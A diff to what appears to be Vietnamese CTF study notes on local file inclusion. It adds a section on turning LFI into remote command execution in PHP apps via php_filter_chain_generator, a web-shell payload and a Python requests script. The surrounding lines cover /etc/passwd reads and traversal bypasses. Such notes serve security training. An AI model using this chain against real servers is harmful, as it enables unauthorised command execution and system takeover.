@@ -45,6 +45,33 @@ if __name__ == "__main__":
 - `"root:" in r.text`: file `/etc/passwd` thật trên Linux luôn có dòng bắt đầu bằng `root:x:0:0:...` — kiểm tra chuỗi này là cách nhanh nhất để biết script đã đọc được file thật, chứ không phải chỉ đọc được 1 trang lỗi 404 có chữ "not found" trông giống thành công.
 - Vòng `for` dừng ngay (`return`) khi gặp payload đúng, các payload còn lại không cần thử tiếp — tiết kiệm thời gian khi chạy cho nhiều đội.
 
+## Từ LFI (đọc file) lên RCE (chạy lệnh) bằng `php_filter_chain_generator` — chỉ áp dụng app PHP
+
+Nếu đích là PHP (thấy đuôi `.php` hoặc header `X-Powered-By: PHP`), và bạn đọc được file nhưng muốn CHẠY LỆNH THẬT thay vì chỉ đọc, có 1 kỹ thuật không cần upload file: lợi dụng PHP filter `php://filter/...` để tự "làm hỏng" dữ liệu đúng cách sao cho PHP in ra đúng đoạn code PHP bạn muốn — rồi chính lỗi LFI include lại đoạn vừa in ra đó, PHP tưởng đó là file PHP thật và CHẠY nó. Tool `php_filter_chain_generator` tại `~/hoc/CTF/Tools/web/php_filter_chain_generator/` tự sinh đúng chuỗi filter này (tự viết tay gần như không thể vì chuỗi filter dài hàng nghìn ký tự):
+
+```bash
+spwn
+cd ~/hoc/CTF/Tools/web/php_filter_chain_generator
+
+# Sinh chuỗi filter mà khi PHP đọc qua, sẽ in ra đúng đoạn code PHP chạy lệnh theo tham số ?cmd=
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
+```
+
+Lệnh trên in ra 1 chuỗi dài bắt đầu bằng `php://filter/convert.iconv...`. Dùng chuỗi đó làm GIÁ TRỊ cho đúng tham số bị lỗi LFI (ví dụ `?page=`), rồi gọi thêm tham số `cmd` để chạy lệnh:
+
+```python
+import requests
+
+base = "http://target"
+filter_chain = "php://filter/convert.iconv...(dán nguyên chuỗi tool in ra)...resource=php://temp"
+
+r = requests.get(base + "/index.php", params={"page": filter_chain, "cmd": "id"}, timeout=5)
+print(r.text[-500:])   # kết quả lệnh "id" thường nằm ở cuối response, sau phần rác do quá trình convert sinh ra
+```
+
+- Chuỗi filter chỉ cần sinh **1 lần** cho 1 đoạn code PHP cố định (`system($_GET["cmd"])`) — dùng lại được cho mọi lệnh sau đó, chỉ cần đổi giá trị `cmd=` mỗi lần gọi, không cần sinh lại chuỗi filter.
+- Kỹ thuật này KHÔNG cần ghi được file nào lên server (khác hẳn File_Upload.md) — chỉ cần app có chỗ `include($_GET['page'])`/`require(...)` không kiểm tra, đây là lý do nó nguy hiểm hơn LFI đọc file thường.
+
 ## Lưu ý nhanh
 
 - Nếu cả 3 payload đều thất bại, thử thêm: double-encode (`%252f`), null byte cũ (`%00` — ít gặp ở hệ thống mới), hoặc tăng/giảm số lượng `../` (server có thể tự cắt bớt 1 vài tầng).
